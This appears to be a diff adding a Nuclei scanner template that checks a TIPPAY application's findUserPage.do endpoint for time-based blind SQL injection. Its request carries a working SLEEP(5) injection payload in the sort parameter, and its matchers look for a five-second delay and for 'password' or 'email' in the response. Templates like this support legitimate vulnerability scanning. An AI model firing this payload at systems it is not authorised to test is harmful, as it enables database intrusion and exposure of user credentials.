@@ -1,0 +1,33 @@
+id: TIPPAY-findUserPage-check
+
+info:
+  name: TIPPAY-findUserPage-check
+  author: iSee857
+  severity: high
+  description: TIPPAY-findUserPage-check
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /trwfe/user/findUserPage.do HTTP/1.1
+        Host: {{Host}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+
+        userName=&deptId=0&page=1&rows=10&sort=(SELECT * FROM (SELECT(SLEEP(5)))x)
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
+
+      - type: words
+        words:
+          - 'password'
+          - 'email'
